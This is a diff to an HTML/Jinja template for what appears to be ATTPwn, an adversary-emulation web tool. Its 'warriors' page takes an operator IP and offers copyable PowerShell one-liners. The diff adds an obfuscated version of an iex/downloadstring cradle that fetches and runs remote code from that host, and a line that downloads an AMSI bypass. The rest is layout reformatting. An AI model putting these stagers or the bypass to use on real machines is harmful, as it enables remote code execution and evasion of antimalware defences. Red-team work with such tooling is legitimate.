@@ -2,23 +2,14 @@
 {%block nav %}
 <nav class="navbar navbar-expand-lg navbar-dark menu">
   <a class="navbar-brand" href="#"><span>ATT</span>Pwn</a>
-  <button
-    class="navbar-toggler"
-    type="button"
-    data-toggle="collapse"
-    data-target="#navbarSupportedContent"
-    aria-controls="navbarSupportedContent"
-    aria-expanded="false"
-    aria-label="Toggle navigation"
-  >
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+    aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
     <span class="navbar-toggler-icon"></span>
   </button>
   <div class="collapse navbar-collapse" id="navbarSupportedContent">
     <ul class="navbar-nav">
       <li class="nav-item">
-        <a class="nav-link" href="/#inicio"
-          >Home <span class="sr-only">(current)</span></a
-        >
+        <a class="nav-link" href="/#inicio">Home <span class="sr-only">(current)</span></a>
       </li>
       <li class="nav-item">
         <a class="nav-link" href="/plan">Plan</a>
@@ -52,11 +43,59 @@
     {% if ip %}
     <div class="col-6 card text-white plan-card p-1 mb-3 d-inline-block">
       <div class="row justify-content-center pt-1">
-        <div class="col-md-10">
-          <p id="copiar" class="text-md-center">
-            powershell.exe -C "iex(new-object
-            net.webclient).downloadstring('http://{{ip}}:5000/consola');consola"
-          </p>
+        <div class="col-md-11 ">
+          <div class="row mt-2 pt-2">
+            <div class="col-md-10 ">
+              <!--<p id="copiar" class="d-none">
+                powershell.exe -C "iex(new-object
+                net.webclient).downloadstring('http://{{ip}}:5000/consola');consola"
+              </p>-->
+              <p class="text-break" id="copiar">
+                <span class="text-warning">powershell.exe</span> <span class="text-secondary"> -C</span> <span
+                  class="text-string"> "iex(new-object
+                  net.webclient).downloadstring('http://{{ip}}:5000/consola');consola"</span>
+              </p>
+            </div>
+            <div class="col-md-2">
+              <button type="submit" class="btn btn-outline" onclick="copyToClipboard('copiar')">
+                Copy
+              </button>
+            </div>
+          </div>
+
+          <div class="row border-top pt-3 mt-2">
+            <div class="col-md-10">
+              <p class="text-break pt-2" id="ofuscado"> <span class="text-warning">powershell.exe</span> <span
+                  class="text-secondary"> -C</span> <span class="text-string"> "iex""(new-object""
+                  net'.'""web""cl""i""ent).""down""loads""trin""g""('http://{{ip}}:5000/consola');con""so""la"</span>
+              </p>
+              <!--<p id="ofuscado" class="d-none">powershell.exe -C "iex""(new-object"" net'.'""web""cl""i""ent).""down""loads""trin""g""('http://{{ip}}:5000/consola');con""so""la"
+              </p> -->
+            
+            </div>
+            <div class="col-md-2 my-auto h-100">
+              <button type="submit" class="btn btn-outline" onclick="copyToClipboard('ofuscado')">
+                Copy
+              </button>
+            </div>
+          </div>
+
+          <div class="row border-top pt-3 mt-2">
+            <div class="col-md-10">
+              <p class="text-break pt-2" id="amsi"></span> <span class="text-string">
+                  iex(new-object net'.'webclient).downloadstring('http://{{ip}}:5000/givemefunctionfile/byp4ss');
+                  </span>
+              </p>
+             
+            </div>
+            <div class="col-md-2 my-auto h-100">
+              <button type="submit" class="btn btn-outline" onclick="copyToClipboard('amsi')">
+                Copy
+              </button>
+            </div>
+          </div>
+  
+
         </div>
       </div>
       <script>
@@ -71,26 +110,17 @@
           window.getSelection().removeAllRanges();
         }
       </script>
-      <div class="row">
-        <div class="col-md-6">
-          <div class="text-right my-1">
-            <a class="btn btn-outline" href="/warriors">
+
+      <div class="row pt-2 justify-content-end ">
+        <div class="col-md-2 col-lg-2 mr-1">
+          <div class="text-right  my-1">
+            <a class="btn  btn-outline" href="/warriors">
               Back
             </a>
           </div>
         </div>
 
-        <div class="col-md-6">
-          <div class="my-1 text-left">
-            <button
-              type="submit"
-              class="btn btn-outline"
-              onclick="copyToClipboard('copiar')"
-            >
-              Copy
-            </button>
-          </div>
-        </div>
+
       </div>
     </div>
     {% endif %} {% if ip == null %}
@@ -104,42 +134,21 @@
         </p>
       </div>
       <div class="card-footer">
-        <form
-          action="/warriors"
-          method="post"
-          name="sentMessage"
-          onSubmit="return validateIPaddress()"
-          id="powerForm"
-          novalidate="novalidate"
-        >
+        <form action="/warriors" method="post" name="sentMessage" onSubmit="return validateIPaddress()" id="powerForm"
+          novalidate="novalidate">
           <label class="text-white text-center table-thead">IP Address</label>
-          <input
-            class="form-control text-black-50"
-            name="ip"
-            id="ip"
-            type="text"
-            placeholder="IP Address"
-            required="required"
-            data-validation-required-message="Need an IP Address to connect."
-          />
+          <input class="form-control text-black-50" name="ip" id="ip" type="text" placeholder="IP Address"
+            required="required" data-validation-required-message="Need an IP Address to connect." />
           <div id="success"></div>
           <div class="form-group">
-            <button
-              type="submit"
-              class="btn btn-outline btn-lg btn-block mt-3"
-              id="sendMessageButton"
-            >
+            <button type="submit" class="btn btn-outline btn-lg btn-block mt-3" id="sendMessageButton">
               Create
             </button>
           </div>
         </form>
       </div>
       <div class="row justify-content-center">
-        <div
-          class="col-md-12 text-center text-danger"
-          id="alertMessage"
-          style="display: none;"
-        >
+        <div class="col-md-12 text-center text-danger" id="alertMessage" style="display: none;">
           You must type a valid IP adress.
         </div>
       </div>
